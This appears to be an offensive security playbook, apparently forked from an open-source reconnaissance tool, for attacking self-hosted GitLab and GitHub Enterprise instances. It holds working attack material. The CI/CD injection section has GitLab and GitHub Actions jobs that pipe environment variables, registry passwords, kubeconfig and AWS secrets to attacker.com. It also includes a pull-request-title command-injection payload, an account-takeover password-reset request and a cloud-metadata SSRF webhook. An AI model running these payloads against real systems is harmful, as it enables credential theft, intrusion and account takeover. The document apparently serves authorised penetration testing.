<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: gitlab-github
description: Security testing playbook for GitLab and GitHub Enterprise covering exposed repositories, CI/CD pipeline injection, token extraction, IDOR, and self-hosted instance vulnerabilities
---

# GitLab / GitHub Enterprise Security Testing

Source code repositories are high-value targets. Attack surface: exposed private repos, hardcoded secrets in code/history, CI/CD pipeline injection (SAST bypass, token theft), IDOR in project access, webhook abuse, and numerous GitLab-specific CVEs.

---

## Reconnaissance

### Discovery

    # Common self-hosted GitLab/GitHub paths
    GET /                           # Landing page — check if private instance
    GET /explore                    # GitLab: public project browser
    GET /explore/projects           # Public projects
    GET /explore/groups             # Public groups
    GET /users/sign_in              # Login page (reveals version)
    GET /help                       # GitLab version disclosure

    # GitHub Enterprise:
    GET /login                      # Enterprise login
    GET /api/v3/                    # GitHub Enterprise API
    GET /-/health                   # Health check (GHE)

    # GitLab version fingerprinting:
    GET /-/manifest.json            # GitLab version in manifest
    GET /-/health                   # Health endpoint
    curl <target> | grep -i "gitlab\|version"
    # Look for: <meta content="GitLab 16.5.0" name="description">

---

## Public Repository Enumeration

    # Enumerate public repos (GitLab):
    GET /api/v4/projects?visibility=public&per_page=100
    GET /api/v4/users/<username>/projects
    GET /explore/projects?sort=latest_activity_desc

    # Search public repos for keywords:
    GET /search?search=password&scope=blobs         # GitLab code search
    GET /search?search=api_key&scope=blobs
    GET /search?search=secret&scope=blobs
    GET /search?search=BEGIN+RSA+PRIVATE&scope=blobs

    # GitHub Enterprise API:
    curl https://<ghe-host>/api/v3/repos?type=public&per_page=100 \
      -H "Authorization: token <token>"

---

## Secret/Token Extraction from Repos

    # Search commit history for secrets (git history mining):
    git clone <repo_url>
    git log --all --full-history -p | grep -iE "password|secret|api.?key|token|credential|private.?key"

    # Tools for automated secret scanning:
    # trufflehog — entropy + regex detection
    trufflehog git <repo_url> --json
    trufflehog git file://./local-repo --json

    # gitleaks
    gitleaks detect --source=./repo --verbose

    # Scan GitLab API for exposed secrets in public code:
    curl "https://<gitlab>/api/v4/search?scope=blobs&search=password&per_page=100" \
      -H "PRIVATE-TOKEN: <token>"

    # Check .env files committed accidentally:
    git log --all -- '*.env' -p
    git log --all -- '*.pem' -p
    git log --all -- 'id_rsa' -p
    git log --all -- 'credentials*' -p

    # GitLab snippet search (public snippets):
    GET /explore/snippets?sort=latest_activity_desc

---

## CI/CD Pipeline Injection

If you can contribute to a repo or modify pipeline config:

    # GitLab CI — .gitlab-ci.yml injection:
    stages:
      - exfil
    steal_secrets:
      stage: exfil
      script:
        - env | curl -F "data=@-" https://attacker.com/  # Exfil all env vars
        - cat $CI_REGISTRY_PASSWORD | curl -F "data=@-" https://attacker.com/
        - echo "$KUBE_CONFIG" | curl -F "data=@-" https://attacker.com/

    # GitHub Actions — .github/workflows injection:
    name: Exfil
    on: [push]
    jobs:
      steal:
        runs-on: ubuntu-latest
        steps:
          - name: Exfil secrets
            env:
              SECRET: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
            run: |
              curl -F "d=$SECRET" https://attacker.com/

    # Pipeline secret injection via PR (fork-based):
    # Fork repo → modify workflow → open PR → pipeline runs with repo secrets
    # Note: GitHub Actions restricts secrets on fork PRs by default (but often misconfigured)

    # Check if workflow uses user-controlled input unsafely:
    # Vulnerable:
    - run: echo "${{ github.event.pull_request.title }}"   # Title injection
    # Attack PR title: `"; curl https://attacker.com/?x=$(env|base64); echo "`

---

## GitLab API Exploitation

    # With token (PRIVATE-TOKEN):
    curl -H "PRIVATE-TOKEN: <token>" https://<gitlab>/api/v4/user       # Current user
    curl -H "PRIVATE-TOKEN: <token>" https://<gitlab>/api/v4/projects   # All projects
    curl -H "PRIVATE-TOKEN: <token>" https://<gitlab>/api/v4/admin/users  # Admin: all users

    # List all users (admin):
    curl -H "PRIVATE-TOKEN: <admin_token>" https://<gitlab>/api/v4/users?per_page=100

    # Access private repos:
    curl -H "PRIVATE-TOKEN: <token>" https://<gitlab>/api/v4/projects/<id>/repository/files/<file_path>/raw?ref=main

    # Download entire repo:
    curl -H "PRIVATE-TOKEN: <token>" https://<gitlab>/api/v4/projects/<id>/repository/archive?sha=main

    # List CI/CD variables (secrets):
    curl -H "PRIVATE-TOKEN: <token>" https://<gitlab>/api/v4/projects/<id>/variables
    # Returns: all CI/CD secret variables in plaintext!

    # List environment variables of a pipeline run:
    curl -H "PRIVATE-TOKEN: <token>" https://<gitlab>/api/v4/projects/<id>/pipelines/<pipeline_id>/jobs

---

## IDOR in GitLab/GitHub

    # GitLab project ID enumeration:
    GET /api/v4/projects/1          # Check sequential project IDs
    GET /api/v4/projects/2
    # Private projects return 404, but may return 401 (exists, no access)

    # User enumeration:
    GET /api/v4/users/1             # User by ID
    GET /<username>                 # User profile page

    # Merge request / PR enumeration:
    GET /api/v4/projects/<id>/merge_requests?state=all

    # Issue access control (may expose private issue content):
    GET /api/v4/projects/<id>/issues/<issue_id>

---

## GitLab Registration Abuse

    # If registration is open on self-hosted GitLab:
    # 1. Register account
    # 2. Access internal projects, wikis, snippets
    # 3. Internal GitLab may have much weaker access control

    GET /users/sign_up              # Registration page
    # Register → check /explore for internal projects
    # Invite yourself to projects via @mention in issues

---

## Common GitLab CVEs

| CVE | GitLab Version | Impact |
|-----|---------------|--------|
| CVE-2021-22205 | < 13.10.3 | RCE via image upload (ExifTool) |
| CVE-2022-2992 | < 15.3.2 | SSRF + RCE via import |
| CVE-2023-2825 | 16.0.0 | Path traversal → arbitrary file read |
| CVE-2023-7028 | < 16.5.6 | Account takeover via password reset |
| CVE-2024-0402 | < 16.5.8 | Arbitrary file write → RCE |

    # CVE-2021-22205 — RCE via ExifTool image upload (no auth required):
    # Upload a crafted DjVu file to trigger RCE via ExifTool parser
    # Tools: https://github.com/CsEnox/Gitlab-Exiftool-RCE
    python3 exploit.py -t https://<gitlab> -u <user> -p <pass>

    # CVE-2023-7028 — Password reset to arbitrary email:
    POST /users/password
    {"user": {"email[]": ["victim@target.com", "attacker@evil.com"]}}
    # Reset token sent to both emails → account takeover

    # Nuclei:
    nuclei -t cves/ -tags gitlab -u https://<gitlab>
    nuclei -t cves/ -tags github -u https://<ghe>

---

## GitHub Token Abuse

    # GitHub token formats:
    # ghp_ = personal access token (classic)
    # github_pat_ = personal access token (fine-grained)
    # ghs_ = GitHub Apps token
    # ghr_ = OAuth refresh token

    # Test token validity:
    curl -H "Authorization: token ghp_xxx" https://api.github.com/user
    # Returns user info if valid

    # Enumerate accessible repos:
    curl -H "Authorization: token ghp_xxx" https://api.github.com/user/repos?per_page=100&type=all

    # Access private repos:
    curl -H "Authorization: token ghp_xxx" https://api.github.com/repos/<owner>/<repo>/contents/

    # List organization secrets (if token has admin rights):
    curl -H "Authorization: token ghp_xxx" https://api.github.com/orgs/<org>/actions/secrets

---

## Webhook Exploitation

    # If you can create/modify webhooks:
    # Set webhook URL to attacker server to receive:
    # - Push events (code + secrets in commits)
    # - Pull request events (PR bodies, reviewer lists)
    # - Pipeline events (build outputs, artifact paths)

    # GitLab webhook SSRF:
    # Create webhook pointing to internal service:
    POST /api/v4/projects/<id>/hooks
    {"url": "http://169.254.169.254/latest/meta-data/", "push_events": true, "token": "test"}
    # Trigger a push → GitLab makes request to IMDS → response in webhook delivery logs

---

## Pro Tips

1. Search `.gitlab-ci.yml` and `.github/workflows/` for hardcoded secrets and unsafe `${{ }}` expressions
2. GitLab `/api/v4/projects/<id>/variables` with a token = all CI/CD secrets in plaintext
3. CVE-2023-7028 (GitLab password reset) works on many unpatched instances — test first
4. `trufflehog` and `gitleaks` find secrets deleted from HEAD but still in git history
5. GitLab Runner tokens in `.gitlab-ci.yml` or job logs allow registering malicious runners
6. Webhook SSRF via GitLab hook delivery is a reliable internal network probe
7. Public GitLab instances often have `registration allowed` — register and explore internal projects

## Summary

GitLab/GitHub testing = secret scanning in git history (trufflehog/gitleaks) + CI/CD pipeline injection via `.gitlab-ci.yml` / GitHub Actions + GitLab CVE check (CVE-2023-7028 password reset, CVE-2021-22205 RCE) + API token enumeration. Git history contains secrets deleted from HEAD — always scan history. CI/CD pipeline variables are the most common source of cloud credentials in enterprise environments.
